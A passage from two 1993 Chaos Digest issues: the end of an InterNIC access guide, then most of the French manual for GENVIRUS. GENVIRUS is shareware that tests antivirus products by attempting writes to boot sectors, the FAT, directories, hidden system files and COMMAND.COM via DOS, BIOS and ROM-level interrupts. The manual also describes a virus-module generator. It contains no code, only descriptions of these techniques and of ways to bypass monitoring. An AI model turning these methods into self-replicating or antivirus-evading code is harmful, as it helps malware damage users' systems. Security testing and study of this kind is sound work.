FAX:        619.455.3990

E-mail:    info@internic.net

Mail:

InterNIC Information Services
General Atomics
P.O. Box #85608
San Diego, California 92186-9784


2. InterNIC Information Services Mailboxes and Mailing Lists
+------------------------------------------------------------

* mailbox: info@internic.net

The place to send general questions about getting connected to the
Internet and how to locate and access information for using the network
more effectively. Also for any questions concerning Information
Services offerings. Queries sent to this mail-box are answered by the
Referral Desk staff.


* mailing list: announce@is.internic.net

An announcements-only mailing list for anyone interested in getting
up-to-date information about the InterNIC and the services it provides.
Everyone is welcome to subscribe, and network administrators and NIC
staff are encouraged to establish local exploders at their institutions
for re-distribution of this list. This will be a moderated,
announcement-only mailing list, and volume will be low.

send mail to:         listserv@is.internic.net

in the body of the message type:

                    subscribe announce your name

* mailing list: nics@is.internic.net

Intended for staff at midlevel, campus, and discipline-specific NICs.
Content will include InterNIC services aimed specifically at NICs, and
mail sent to this list will be oriented towards providing services to
end users, including new training resources and documentation. All NIC
staff are encouraged to subscribe. This will be a moderated list, and
volume will be low.


send mail to:         listserv@is.internic.net

in the body of the message type:

                      subscribe nics your name


* net-resources@is.internic.net

Formerly nis@cerf.net, this list aims to serve network information
service providers and end users. This list is a group effort of people
all over the Internet to concentrate announcements of new resources
onto one list. It is moderated, and contains only announcements of new
tools and resources available over the Internet. The goal is to keep
the volume low, therefore this is not a discussion list.

If you would like to stay current on network services without having to
read every mailing list, join the net-resources-list. If you would like more
information about participating in the net-resources-list by becoming a
monitor, send a note to scout@internic.net.

send mail to:         listserv@is.internic.net

in the body of the message type:

                 subscribe net-resources your name


* mailbox: scout@internic.net

The place to send information about any new tools or resources on the
network for possible distribution on the nis mailing list or inclusion
in the InfoSource. Also the place to send for information regarding
participating in the nis-list by becoming a list monitor.


* hardcopy or electronic mailing list: The InterNIC InterActive

InterNIC Information Services publishes a bi-monthly newsletter, the
InterNIC InterActive, covers network information services issues of
interest to the entire community, such as tools, resources, training
opportunities, and networking organizations. InterNIC InterActive also
details existing and new services provided by all three areas of the
InterNIC: Information Services, Directory and Database Services, and
Registration Services.

To subscribe to the InterNIC InterActive, send a message to
interactive-request@is.internic.net. Please indicate in your message if
you would like to receive the newsletter in harcopy format, electronic
format, or both.


3. The InfoSource
+------------------

The InfoSource is a collection of information designed to make finding
out about the Internet easier. There are sections for getting started,
for NICs, and for general information which may be of interest to
everyone. Also included is info on all the services offered by InterNIC
Information Services. Browsing the "InfoSource Table of Contents" file
will provide details on what is available.

In many cases the InfoSource contains actual documents on a given topic,
and in other cases pointers are given to alternate archives of
information. The InfoSource contents will be maintained regularly to keep
it current, and new information will be added as it becomes available. If
you have a document or resource you'd like to submit for inclusion, or a
suggestion for a topic which should be included, let us know by sending
mail to: scout@internic.net.

There are several ways to access the InfoSource, which include FTP,
Gopher, e-mail, and telnet.


Accessing the InfoSource
+------------------------

The InfoSource can be accessed electronically using FTP, telnet, Gopher,
WAIS, and e-mail. Below are instructions for each access method. Included
under each access method are instructions for retrieving a file which
lists the documents available. An overview of each of these tools and how
to use them is available under the directory "Learning to Use the
Network".

If you have any questions or problems, send mail to info@internic.net
or call 800.455.4345.


1. FTP Access
+-------------

To retrieve documents from the InfoSource using anonymous FTP:

ftp is.internic.net

login: anonymous

password: your e-mail address

cd infosource

get INDEX

The INDEX file contains a complete listing of what's
contained in the InfoSource so that you can browse for the things you
may find useful. After you have identified a document you wish to
retrieve, standard FTP commands can be used to retrieve the file, such
as change directory (cd), directory listing (dir), and send file (get
filename).


2. Gopher Access
+----------------

If you have a gopher client, point it at:  is.internic.net

If you don't have a Gopher client, telnet to:

is.internic.net

login:  gopher

This command will allow you to use the Gopher client on the
is.internic.net machine.*

Once in gopherspace you can move up and down the menu system to see
what's available. Browsing the "InfoSource Table of Contents"  on the
main menu will let you see the entire heirarchy at a glance. The Table
of Contents also indicates where direct links have been established to
other Gopher servers.

Copies of documents contained in the Gopher server can be sent to you
electronically via e-mail. To receive a copy of a document you are
reading:

quit out of the file

type "m" as indicated

type your e-mail address in the space provided

hit enter

continue browsing in gopherspace

* We encourage the installation of a Gopher client on your local host if
possible, since this will provide faster and more efficient access to the
InfoSource and many other archives. To learn more about Gopher and how to
acquire the freely accessible Gopher client software, go to "Learning to
Use the Network" under the "Getting Started" menu, and look under "CNIDR".


3. Telnet Access
+----------------

For individuals without access to a Gopher client, several telnet ports on
the is.internic.net machine are configured for direct access to a Gopher
client located on that machine. By using this local Gopher client it is
possible to browse the menus and documents in the InfoSource before
moving them to your local host.

To access the Gopher server via the local client:

telnet is.internic.net

login: gopher

Follow the instructions listed above under "Gopher Access".  Please also
note the footnote at the end of that section regarding acquiring Gopher
client software.


4. WAIS
+-------

The InfoSource is registered in the Directory of Servers and can
therefore be accessed through a public WAIS client, or directly by using a
WAIS client located on your own host.

source name: internic-infosource

server name: is.internic.net

Another option is to use WAIS through the Gopher Server on the InfoSource.
To use this option, select "Search the InfoSource by Keyword"
located on the top level Gopher menu.


5. E-mail Access
+----------------

The documents archived in the InterNIC InfoSource can be retrieved via
electronic mail using a mail-server program running on the is.internic.net
machine. The purpose of a mail-server program is to read an e-mail message
sent as reqests to the server, decipher the commands located in the body
of the message, and execute those commands - which usually entails sending
particular files back to the requester in another e-mail message.

To receive complete instructions for using all the commands available from
the InfoSource mail-server, send mail to:

mailserv@is.internic.net

in the body of the message, type:

send help

To receive a file with the filenames of all documents available from the
InfoSource mail-server, send to the same address, and in the body of the
message type:

INDEX

Note that both upper and lower case syntax will be  accepted by the
mail-server program for commands. However, when typing filenames, be
careful to use the exact case syntax used for the filename.

_________
As noted above, if you have any questions, problems, or suggestions
concerning access to the InfoSource, contact the InterNIC Information
Services Staff at info@internic.net or 800.444.4345.

------------------------------

End of Chaos Digest #1.53
************************************

Chaos Digest               Jeudi 17 Juin 1993        Volume 1 : Numero 54
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.54 (17 Juin 1993)
File 1--_GenVirus_, premier geneur de virus francais [#1] (manuel)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: THU JUN 17 15:15:40 -0400 1993
From: Jacques.Struss@email.teaser.com (Jacques Struss )
Subject: File 1--_GenVirus_, premier geneur de virus francais [#1] (manuel)


















                             G E N V I R U S
                            =================


                               Version 2.00



                           MANUEL D'UTILISATION

                        (de la version limitee et
                       de la version avec licence)




                        Tous droits reserves 1993


                                J. STRUSS
                          82, rte de Reutenbourg
                            67440  LOCHWILLER











-------------------------------------------------------------------------
 Ce programme est distribue en SHAREWARE, c'est a dire gratuitement mais
dans une version limitee. Sa copie est libre et meme vivement encouragee.
  Mais si l'utilisateur desire obtenir la version complete du programme,
 il doit l'acquerir aupres de l'auteur moyennant une faible retribution.
-------------------------------------------------------------------------
--

                           TABLES DES MATIERES
                           -------------------



    - LA LEGISLATION ...................................page 3

    - POURQUOI GENVIRUS ................................page 4

    - LA DISQUETTE GENVIRUS ............................page 6
              Contenu de la disquette ..................page 6
              Lancement de GENVIRUS ....................page 7
              Options de la ligne de commande ..........page 7

    - UTILISATION DE GENVIRUS ..........................page 7
              Commandes et emploi de GENVIRUS...........page 7
              Les menus disponibles ....................page 8
              Le menu TEST .............................page 9
              Le menu GENERATEUR .......................page 13
                   Action du module.....................page 14
                   Strategie du module..................page 16
                   Declenchement du module..............page 17
                   Camouflage du module.................page 18
                   Reproduction du module...............page 20
                   Fabrication du module................page 22
              Le menu ENREGISTREMENT ...................page 23
                   Le shareware ........................page 23
                   L'indentification des modules........page 23
                   Cout ................................page 24
                   Formulaire ..........................page 24
              Le menu AIDE .............................page 25
                   Utilisation de GENVIRUS .............page 25
                   GENVIRUS ............................page 25
                   Avertissement .......................page 25
                   Les virus ...........................page 25
                        Comment detecter les virus .....page 25
                        Protection .....................page 25
              Le menu FIN ..............................page 26

    - BON DE COMMANDE ..................................page 27
















         DOCUMENTATION de GENVIRUS V2.00    Page :   2
--

                        LA LEGISLATION
                        ==============



ARTICLE 462-2 - Delit d'acces frauduleux dans un systeme informatique :

- Quiconque, frauduleusement, aura accede ou se sera maintenu dans tout ou
partie d'un systeme automatise de donnees sera puni d'un emprisonnement de
deux mois a un an et d'une amende de 2.000F a 50.000F ou de l'une de ces
deux peines.
- Lorsqu'il en sera resulte soit la suppression ou la modification de
donnees contenues dans le systeme, soit une alteration du fonctionnement
de ce systeme; l'emprisonnement sera de deux mois a deux ans et l'amende
de 10.000F a 100.000F.

ARTICLE 462-3 - Delit d'entrave au fonctionnement d'un systeme
informatique :

- Quiconque aura, intentionnellement et au mepris des droits d'autrui,
entrave ou fausse le fonctionnement d'un systeme automatise de donnees
sera puni d'un emprisonnement de trois mois a trois ans et d'une amende de
10.000F a 100.000F ou de l'une de ces deux peines.

ARTICLE 462-4 - Delit d'abus d'autorisation d'acces a un systeme
informatique :

- Quiconque aura, intentionnellement et au mepris des droits d'autrui,
directement ou indirectement introduit des donnees dans un systeme de
traitement automatise ou supprime ou modifie les donnees qu'il contient ou
leurs modes de traitement ou de transmission, sera puni d'un
emprisonnement de trois mois a trois ans et d'une amende de 2.000F a
500.000F ou de l'une de ces deux peines.

ARTICLE 462-5 - Delit de falsification de documents informatises :

- Quiconque aura procede a la falsification de documents informatises,
quelle que soit leur forme, de nature a causer un prejudice a autrui, sera
puni d'un emprisonnement d'un an a cinq ans et d'une amende de 20.000F a
2.000.000F



















         DOCUMENTATION de GENVIRUS V2.00    Page :   3
--

POURQUOI GENVIRUS ?
-------------------

GENVIRUS a  ete ecrit  pour comprendre  et demontrer le fonctionnement des
virus informatiques et egalement pour tester l'efficacite de la protection
des programmes 'antivirus' disponibles sur le marche.

En  effet,   le  phenomene   virus  inquiete  tellement  les  utilisateurs
d'ordinateurs qu'ils  en sont  a soupconner leur presence des l'apparition
d'un quelconque probleme, oubliant par la-meme qu'ils en sont certainement
la seule cause et qu'aucun virus ne se trouve dans leur machine.

L'auteur pense  que seule une bonne connaissance des modes operatoires des
virus permettra  d'en limiter  les mefaits et facilitera la protection des
donnees sensibles  et donc  la  mise  en  place  de  methodes  de  travail
adaptees, methodes  que l'on  designe  habituellement  sous  le  terme  de
'Securite Informatique'.


Il faut  dire que les rumeurs les plus folles courent sur les possibilites
des virus, telles que :

            - la capacite des  virus de modifier les routines du BIOS
                ecrites dans des EPROMS (seule une exposition aux
                rayons ultra-violet peut effacer de telles memoires).

            - la subsitance des virus dans la RAM meme apres la mise
                hors tension de l'ordinateur.

            - la contamination d'une disquette saine au contact d'une
                disquette malade en les posant l'une sur l'autre.

            - etc.


Une chose  est sure,  c'est que  les personnes  reellement touchees par un
virus savent maintenant plus ou moins se proteger, mais la grande majorite
des utilisateurs  d'ordinateurs ne  savent pas  a quoi un virus ressemble,
comment il procede, se cache, se declenche.

C'est en fait cette non-information qui est dangereuse.

L'ideal serait  de pouvoir  disposer d'une panoplie complete et clairement
identifiee de  petits modules  reagissant comme  des virus. Ces programmes
seraient mis en oeuvre avec toutes les precautions possibles (sauvegardes)
et ainsi  sans dommages  pour l'utilisateur.  Il aurait ainsi le loisir de
constater les menaces qui pesent sur ses programmes et ainsi s'en premunir
efficacement car  bien sur,  les cibles  ou les  actions des  ces  modules
seraient connues avant leurs attaques.









         DOCUMENTATION de GENVIRUS V2.00    Page :   4
--

L'autre bonne  raison ayant  conduit l'auteur  a creer  GENVIRUS est que ,
malgre l'installation  d'une protection  logicielle du  commerce qu'il  ne
citera pas,  il a vu s'introduire dans sa machine une de ces sales petites
betes alors qu'il se croyait en toute securite.

Les enjeux  sont tels  qu'il existe  a l'heure  actuelle des programmes de
tests sur tout et n'importe quoi, qu'il serait dommage de ne pas avoir les
memes exigences  envers ces  programmes de protection, car une fois tel ou
tel logiciel  de protection  installe, on  ne sait de quel niveau exact de
garantie l'utilisateur  beneficie contre une eventuelle attaque virale. Il
ne lui  reste plus  que l'attente  et l'espoir de disposer de la meilleure
securite possible.

Je ne  pense pas  que ce  soit la  meilleure solution et il vaudrait mieux
prendre de  suite conscience  des limites exactes de la protection offerte
par votre  programme 'antivirus'  prefere. Il  en decoulera donc toute une
serie de  mesures a  prendre pour  se preserver  de ces  defauts  dans  la
supposee  cuirasse  infaillible  vantee  par  certains  editeurs  de  tels
logiciels de defense.


GENVIRUS est  capable de fournir une indication de ce niveau de protection
et ceci  en toute  securite. Il  vous fournira  la possibilite d'effectuer
diverses tentatives  d'ecriture sur les secteurs critiques de votre disque
et d'attendre la reaction du logiciel protecteur.

Certains programmes  demandent quant  a eux,  une attaque  externe par  un
module independant  pour reagir,  car ils interrompent en general de facon
trop brutale et souvent fatale l'execution en cours.

GENVIRUS est  donc en  mesure de  generer des modules de test qui ont pour
but de  simuler l'action  de vrais  virus  (possible  uniquement  avec  la
version disposant  de la  licence). L'avantage  de cette  methode  est  de
controler pleinement  le declenchement, le mode d'action, la reproduction,
l'infiltration, le  lecteur  ou  la  cible  de  votre  module  (exemple  :
modification de COMMAND.COM ou d'un autre fichier que vous aurez designe).

Ceci vous laisse le loisir de faire des sauvegardes ou copies des fichiers
que vous  aurez choisis car seulement ceux-ci auront a subir les affres de
vos petits  demons. Vous ne serez pas pris en traitre et garderez ainsi la
maitrise totale  de l'evolution  de la  contagion et  de ses consequences.
Cette affirmation  n'est exacte  que pour  vous (car  vous  seul  etes  au
courant) et  toute tierce  personne, ou  systeme sera  par contre  pris au
piege et supportera des lors des desagrements plus ou moins serieux tout a
fait reprehensibles par la loi (voir rubrique AVERTISSEMENTS).

Cet etat  de fait  est parfaitement inadmissible et n'est pas le but de ce
programme. Il  ne doit  servir qu'a  vous preparer  a la  lutte contre les
vrais virus  en observant vous-memes les evolutions et les moyens d'action
REELS de  ceux-ci mais  en toute  securite. Il  n'existe pas  de bon ou de
mauvais virus !








         DOCUMENTATION de GENVIRUS V2.00    Page :   5
--

C'est pourquoi  la partie  du generateur  de  modules  de  GENVIRUS  n'est
disponible qu'aupres  de l'auteur  qui procedera  au  marquage  de  chaque
version par  des codes  specifiques qui  identifieront ces modules afin de
les reserver  a un usage strictement personnel. De plus, c'est le plus sur
moyen de pouvoir disposer d'une version exempte de virus !  L'experience a
montre que  meme avant  de poursuivre  la diffusion  de programme orientes
'protection', des petits malins les infestent volontairement.

La LOI  est formelle,  il est INTERDIT de fabriquer des virus qui accedent
FRAUDULEUSEMENT a  un systeme  automatise  de  donnees  (ordinateur),  qui
apportent une  entrave au fonctionnement de tels systemes, qui falsifient,
detruisent ou  deteriorent des  informations (programmes  ou  fichiers  de
donnees). Par  contre, si  de tels  programmes ne  sortent  pas  de  votre
ordinateur (vous etes libres !), il vous est permis de proceder a tous les
tests que vous jugerez utiles.

ATTENTION :  le maniement de tels modules n'est PAS un JEU !  Les tests ne
doivent servir  qu'a l'evaluation  de VOTRE  materiel et  ne  jamais  etre
diffuses sous quelque forme que ce soit.

GENVIRUS en  contraction de  'gene-virus' devrait  donc servir  a  balayer
certaines idees  recues et  finalement  dissuader  les  auteurs  de  codes
virulents de  persister dans cette voie, leurs mefaits risquant de plus en
plus de ne pas aboutir.



LA DISQUETTE GENVIRUS
=====================

    CONTENU DE LA DISQUETTE
    -----------------------

La disquette GENVIRUS contient les fichiers suivants :

            - GV.EXE .........le programme GENVIRUS
            - GV.DOC .........la documentation du programme
            - ELIMGVIR.EXE ...programme de recherche de modules GENVIRUS
            - MODPRN.COM .....programme residant pour imprimante non
                            capable des caracteres graphiques IBM.
            - LISEZMOI.DOC ...note complementaire a lire absolument.


La documentation  de GENVIRUS  (27 pages)  peut etre  imprimee en tapant a
l'invite du DOS la commande :

    COPY GV.DOC > PRN   puis ENTER

Si votre  imprimante ne  peut imprimer  les  caracteres  speciaux  (cadres
graphiques, etc...),  avant de declencher la commande d'impression, lancez
le programme MODPRN, il substituera tous ces caracteres par d'autres moins
specifiques.







         DOCUMENTATION de GENVIRUS V2.00    Page :   6
--

    LANCEMENT DE GENVIRUS
    ---------------------

Le lancement  de GENVIRUS  se fait  en tapant  simplement GV puis ENTER au
niveau du DOS.

GENVIRUS necessite 256K de RAM, un DOS 2.11 ou plus et est compatible avec
toutes les cartes video.

    OPTIONS DE LA LIGNE DE COMMANDE
    -------------------------------

GENVIRUS est  capable de reconnaitre le type d'adaptateur video present et
d'en assurer  la programmation.  Toutefois, il  est possible  de forcer un
type d'affichage suivant le cas, en indiquant l'option /M ou /B.

    Exemple :

        GV /C puis ENTER   force le mode texte couleur de la carte CGA.
                        option utile pour certaines cartes VGA ou EGA.
                        Cette option programme la carte video dans le
                        mode 2 (mode texte 80x24 16 couleurs)

        GV /M puis ENTER   force le mode video de la carte monochrome.
                        (attention, une vraie carte monochrome doit
                        etre presente a l'adresse B000:0000 sinon
                        l'ecran restera noir).

        GV ? puis ENTER    affiche un texte d'aide resumant les options
                        disponibles.


UTILISATION DE GENVIRUS
=======================

    COMMANDES ET EMPLOI DE GENVIRUS
    -------------------------------

GENVIRUS utilise  le principe  des menus  deroulants. La  selection  d'une
option se fait :

    - par appui sur les fleches de direction, la validation est effectuee
        avec la touche ENTER.

    - par deplacement de la souris, la validation se fait en cliquant sur
        un bouton de celle-ci (en regle generale, un clic souris (bouton
        gauche) est egal a un appui sur la touche ENTER).

    - par appui sur la touche representant la lettre en majuscule de
        l'option souhaitee, la validation est dans ce cas automatique.

La touche ESCAPE referme toujours la derniere fenetre ouverte et permet un
retour a l'option precedente.

L'appui sur  la touche F1 (ou le bouton droit de la souris) affiche a tout
moment un texte d'aide en rapport avec la fonction selectionnee.



         DOCUMENTATION de GENVIRUS V2.00    Page :   7
--

    LES MENUS DISPONIBLES
    ---------------------

Apres le  lancement de  GENVIRUS apparait  en haut  de l'ecran  une  barre
horizontale des 5 menus disponibles. Ce sont:

            - le menu  FIN;
            - le menu  TEST;
            - le menu  GENERATEUR;
            - le menu  ENREGISTREMENT;
            - le menu  AIDE.


    Le menu FIN n'est pas a proprement parler un menu, mais sert a
        quitter le programme GENVIRUS et retourner au niveau du DOS.

    Le menu TEST permet de lancer en interne l'evaluation de la
        protection d'un lecteur quelconque avec recuperation des erreurs
        critiques.

    Le menu GENERATEUR permet la realisation des modules avec des
        caracteristiques totalement programmables par l'utilisateur.

    Le menu ENREGISTREMENT fournit des explications sur le principe du
        SHAREWARE, la necessite de l'enregistrement aupres de l'auteur
        ainsi que le formulaire de commande.

    Le menu AIDE explique les commandes de GENVIRUS et donne des
        conseils de protection contre les virus.






























         DOCUMENTATION de GENVIRUS V2.00    Page :   8
--

    LE MENU TEST
    ============

La fonction  TEST de  GENVIRUS  effectue  l'evaluation  de  la  protection
offerte par les programmes anti-virus.

Cette evaluation  est faite  en tentant d'ecrire sur le support magnetique
(tentative  de   modification  de   donnees)  a  l'insu  d'une  eventuelle
protection. Chaque ecriture sera confirmee par la lecture du secteur apres
modification. CES  TESTS NE  SONT PAS DESTRUCTIFS, LE PROGRAMME RESTITUERA
INTEGRALEMENT LES DONNEES QU'IL ARRIVERA A ATTEINDRE.

GENVIRUS est  capable de  tester de  cette maniere  certaines  protections
contre les  virus, mais  beaucoup de  programmes necessitent  une  attaque
externe par un vrai virus pour etre valides car ils attendent le demarrage
de l'ordinateur  pour signaler  apres coup les modifications survenues aux
fichiers  concernes.   Ceci  est  le  cas  en  particulier  des  logiciels
effectuant des 'checksum' (somme de controle) pour detecter les intrus.

GENVIRUS possede  des routines  de traitement  des  erreurs  critiques  ou
fatales mais quelques bizarreries des programmes de protection font que le
plantage de  la machine  reste souvent  la solution ultime de l'indication
d'une attaque par un virus (et ceci meme en l'absence de GENVIRUS).


        OPTIONS DU MENU TEST
        --------------------

Le programme affiche l'ecran suivant :

+-------------------------------------------------------------+
|    Fin+------ TEST ------+ Generateur         Enregistrement|
+-------|                  |----------------------------------+
        | Principe         |
        | choix du Drive   |
        | test Automatique |  +---------------------+
        | test Manuel      |  | Lecteur courant = C:|
        | Retour           |  +---------------------+
        +------------------+

EXPLICATION DES RUBRIQUES :
----------------------------

    - PRINCIPE : resume les principes de la fonction TEST

    - CHOIX du DRIVE : permet le choix du lecteur sur lequel se
            derouleront les tests. Le programme controle la presence
            effective du lecteur demande. Le lecteur courant (celui qui
            sera utilise) est affiche dans une fenetre speciale.
                Cette option est egalement utile pour designer le
            lecteur sur lequel sera ecrit le virus dans le menu
            GENERATEUR
                Dans tous les cas, en quittant le programme, vous
            retournerez sur le lecteur qui a servi au lancement de
            GENVIRUS (systeme a plusieurs lecteurs).




         DOCUMENTATION de GENVIRUS V2.00    Page :   9
--

    - TEST AUTOMATIQUE : lance l'evaluation automatique de toutes les
            options d'ecritures disponibles (correspond a tous les choix
            offerts dans la rubrique TEST MANUEL, voir ci-apres pour
            l'interpretation des messages de compte-rendu de test).

    - TEST MANUEL : l'ecran affiche alors une fenetre correspondant aux
            differents choix possibles :

---------------+------------ CHOIX des TESTS  Aide = F1 -------------+-+
+------ TEST --|                                                     | |
|              |   Ecriture sur BOOT par DOS          (INT 25)       |-+
| Principe     |   Ecriture sur FAT  par DOS          (INT 25)       |
| choix du Driv|   Ecriture sur DIR  par DOS          (INT 25)       |
| test Automati|   Ecriture sur Fich. caches SYSTEME  (INT 21)       |
| test Manuel  |   Ecriture sur COMMAND.COM par DOS   (INT 21)       |
| Retour       |   Ecriture directe sur disque        (INT 25)       |
+--------------|   Ecriture sur BOOT par BIOS         (INT 13)       |
               |   Ecriture sur FAT  par BIOS         (INT 13)       |
               |   Ecriture sur DIR  par BIOS         (INT 13)       |
               |   Ecriture sur Fich. caches SYSTEME  (INT 13)       |
               |   Ecriture sur COMMAND.COM par BIOS  (INT 13)       |
               |   Ecriture directe sur disque        (INT 13)       |
               |   Ecriture sur BOOT           par Driver specifique |
               |   Ecriture sur FAT            par Driver specifique |
               |   Ecriture sur DIR            par Driver specifique |
               |   Ecriture sur F. caches SYST par Driver specifique |
               |   Ecriture sur COMMAND.COM    par Driver specifique |
               |   Ecriture directe sur disque par Driver specifique |
               |   Lancement des tests                               |
               |   Retour                                            |
               +-----------------------------------------------------+

La selection  ou deselection d'un choix s'effectue par appui sur la touche
ENTER ou par 'clic' souris.

Il est  possible de choisir a partir de ce menu les zones specifiques d'un
disque a savoir :

        - la zone BOOT qui contient des informations vitales comme le
            nombre d'octets par secteur, le nombre de secteurs par
            piste, de secteurs par cluster, le nombre de FAT, etc...

        - la FAT qui permet de retrouver la position reelle des portions
            de secteur representant les fichiers.

        - la zone DIR qui contient tous les noms des fichiers ou
            sous-repertoires du disque places dans le ROOT (repertoire
            principal).

        - les fichiers caches d'une disquette systeme (contenant IO.SYS
            et MSDOS.SYS ou IBMBIO.COM et IBMDOS.COM).

        - l'interpreteur de commande COMMAND.COM.

        - l'ecriture directe sur disque qui concerne un secteur
            situe a 75% de la capacite du support.



         DOCUMENTATION de GENVIRUS V2.00    Page :   10
--

Chacune de ces zones peut etre testee en utilisant les services de 3 types
d'interruption d'un niveau logiciel different.

Il s'agit  en premier des services de l'interruption DOS INT 21 et INT 25,
niveau le  plus haut  et le  plus eloigne  du materiel  mais aussi le plus
facile a  utiliser pour  realiser des ecritures sauvages. Heureusement, il
est egalement  tres facile d'effectuer une surveillance des appels a cette
interruption et d'y detecter les procedures delictueuses.

Figurent ensuite  les services  de l'interruption BIOS INT 13 de niveau le
plus bas,  c'est-a-dire le plus proche du materiel. Cette interruption est
deja beaucoup  plus difficile  d'acces  que  la  precedente  car  il  faut
raisonner en  cylindre, cluster,  position relative ou numero de tete. Ici
encore, il est facile d'effectuer une surveillance des appels aux services
de cette  interruption. Il est a noter par-contre que celle-ci possede des
fonctions tres agressives pour le systeme (formatage par exemple).

Pour terminer  figurent les  services d'une  interruption dite  par driver
specifique. Il s'agit en fait de l'interruption 13 a un niveau encore plus
proche de  la machine puisque c'est celle qui se trouve ecrite dans la ROM
du BIOS  ou la  ROM du  controleur de  disque. La difference par rapport a
l'interruption 13  est qu'elle n'utilise pas les vecteurs situes en RAM et
qu'il  est   donc  impossible  de  controler  ou  d'empecher  ces  appels.
Toutefois, le  point d'entree  de la  routine n'etant  pas  si  evident  a
trouver que  cela sur  certaines machines,  il se  peut que le test par ce
driver soit negatif. Il est a noter par ailleurs que moins la machine sera
compatible avec  le standard  des PC,  plus elle  sera a l'abri de ce type
d'attaque.
De plus,  les PC AT sont sensiblement plus resistants dans la recherche du
point d'entree  que les PC/XT, les routines BIOS etant aussi beaucoup plus
variees et personnalisees par chaque constructeur.

    - LANCEMENT DES TESTS : cette rubrique declenche les tests a
        proprement parler. Les messages suivants apparaissent alors en
        regard de chaque ligne d'option :


* TEST NON DEMANDE. le test n'a pas ete demande.

* LE TEST N'A PU SE REALISER. la recherche du point d'entree dans la ROM a
        echoue, un probleme logiciel est apparu ou le disque presente
        des informations incoherentes dans le secteur BOOT.

* ECRITURE REFUSEE : la demande d'ecriture a ete refusee par le systeme.

* ECRITURE AUTORISEE MAIS SECTEUR INTACT : l'ecriture n'a pas ete refusee
        mais la lecture du secteur concerne indique qu'il est toujours
        intact. C'est souvent le fait de programmes anti-virus qui
        bloquent l'ecriture sur le disque en ne renvoyant pas d'erreur
        pour ne pas eveiller l'attention. Ils font croire que tout
        s'est bien passe pour calmer l'agressivite d'un quelconque
        virus.







         DOCUMENTATION de GENVIRUS V2.00    Page :   11

------------------------------

End of Chaos Digest #1.54
************************************

Chaos Digest               Jeudi 17 Juin 1993        Volume 1 : Numero 55
                             ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.55 (17 Juin 1993)
File 1--_GenVirus_, premier geneur de virus francais [#2] (manuel)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: THU JUN 17 15:15:40 -0400 1993
From: Jacques.Struss@email.teaser.com (Jacques Struss )
Subject: File 1--_GenVirus_, premier geneur de virus francais [#2] (manuel)


* ECRITURE REUSSIE: le programme a constate en lisant le secteur concerne
        qu'il a bien ete modifie. Aucune protection d'ecriture n'a joue.

* ECRITURE REUSSIE MAIS SECTEUR DETRUIT: idem  que ci-dessus mais le
        programme est incapable de remettre le secteur  dans son etat
        initial. Si votre logiciel de protection en est la cause,
        (faites l'essai avec et sans) changez en, c'est plus sur!

